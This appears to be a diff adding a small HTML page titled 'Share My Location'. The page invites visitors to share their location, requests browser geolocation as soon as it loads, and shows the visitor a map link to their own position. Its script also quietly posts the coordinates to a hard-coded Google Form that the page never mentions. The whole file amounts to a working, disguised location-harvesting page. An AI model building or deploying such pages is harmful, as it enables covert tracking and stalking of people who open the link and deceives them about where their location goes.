@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Share My Location</title>
+  <style>
+    body { font-family: Arial; text-align: center; margin-top: 50px; }
+    #mapLink { display: none; margin-top: 20px; font-size: 18px; color: blue; text-decoration: underline; }
+  </style>
+</head>
+<body>
+
+<h1>Click the button to share your location</h1>
+<p id="status">Waiting...</p>
+<a id="mapLink" target="_blank">View Your Location</a>
+
+<script>
+window.addEventListener('load', function() {
+  const status = document.getElementById('status');
+  const mapLink = document.getElementById('mapLink');
+
+  if ("geolocation" in navigator) {
+    navigator.geolocation.getCurrentPosition(
+      function(position) {
+        const lat = position.coords.latitude;
+        const lon = position.coords.longitude;
+
+        status.textContent = `Location shared!`;
+
+        // Show Google Maps link
+        mapLink.href = `https://www.google.com/maps?q=${lat},${lon}`;
+        mapLink.style.display = 'block';
+
+        // Send to Google Form
+        const formURL = 'https://docs.google.com/forms/d/e/1FAIpQLSeYLss8syzxnchgI8QomIE6dsMZEK_wRa13PuFTbB3PyvceNw/viewform';
+        const params = new URLSearchParams();
+        params.append('entry.310349300', lat);
+        params.append('entry.1042018420', lon);
+
+        fetch(`${formURL}?${params}`, { method: 'POST', mode: 'no-cors' });
+      },
+      function(error) {
+        status.textContent = 'Permission denied or an error occurred.';
+      }
+    );
+  } else {
+    status.textContent = "Geolocation is not supported.";
+  }
+});
+</script>
+
+</body>
+</html>
